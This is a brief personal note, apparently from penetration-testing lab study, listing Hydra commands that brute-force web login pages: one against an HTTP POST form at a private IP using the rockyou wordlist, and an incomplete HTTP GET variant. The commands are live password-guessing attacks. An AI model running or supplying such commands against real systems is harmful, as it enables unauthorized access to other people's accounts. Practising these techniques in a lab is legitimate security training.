HTP POST FORM

![[6719e356fc317843132b680f58d8ce62-pwa_http_intercept2.png]]
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

HTTP -GET

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.221.20